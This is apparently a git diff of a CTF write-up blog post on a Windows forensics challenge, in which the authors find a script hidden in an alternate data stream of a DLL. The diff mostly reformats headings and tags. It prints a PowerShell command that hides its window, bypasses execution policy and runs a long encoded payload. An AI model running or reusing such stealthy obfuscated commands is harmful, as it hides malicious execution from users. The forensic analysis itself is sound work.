@@ -2,18 +2,17 @@
 layout: post
 title: "HTB Cyber Apocalypse CTF 2023- Artifacts of Dangerous Sightings [Forensic]"
 categories: ctf
-tags: fore blast_o mz4b
+tags: forensics blast_o mz4b
 date: 2023-03-24 10:00:00 +0100
 author: blast_o, mz4b
 ---
 
 # Artifacts of Dangerous Sightings - Difficulty: medium
 
-### `Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces ...`
+`Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces ...`
 
-<br>
-<br>
 
+## hidden.ps1
 We are given the following file `2023-03-09T132449_PANDORA.vhdx`
 
 
@@ -55,6 +54,7 @@ Get-Content .\ActiveSyncProvider.dll -stream hidden.ps1
 powerShell.exe -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc JAB7AFsAfgBAAH0AIAA9ACAAJAAoACkAOwAgACQAewAhACEAQAAhACEAXQB9ACAAPQAgACsAKwAkAHsAWwB+AEAAfQA7ACAAJAB7AFsAWwAhAH0AIAA9ACAALQAtACQAewBbAH4AQAB9ACAAKwAgACQAewAhACEAQAAhACEAXQB9ACAAKwAgACQAewAhACEAQAAhACEAXQB9ADsAIAAkAHsAfgB+AH4AXQB9ACAAPQAgACQAewBbAFsAIQB9ACAAKwAgACQAewAhACEAQAAhACEAXQB9ADsAIAAkAHsAWwAhACEAWwAhAH0AIAA9ACAAJAB7AFsAWwAhAH0AIAArACAAJAB7AFsAWwAhAH0AOwAgACQAewAoAH4AKAAhAH0AIAA9ACAAJAB7AH4AfgB...
 
 ```
+## Decoding the script
 
 Let's decode the b64 string found:
 ```
